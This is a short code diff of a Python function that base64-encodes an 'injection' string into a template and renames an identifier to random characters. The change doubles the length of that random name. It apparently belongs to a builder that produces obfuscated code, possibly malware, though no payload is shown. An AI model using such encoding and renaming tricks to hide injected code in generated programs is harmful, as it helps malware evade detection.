@@ -58,7 +58,7 @@ def WriteSettings(code: str, settings: dict, injection: str) -> str:
     if injection is not None:
         code = code.replace("%injectionbase64encoded%", base64.b64encode(injection.encode()).decode())
         
-    random_chars = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
+    random_chars = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
     code = code.replace("Settings", random_chars)
     
     return code
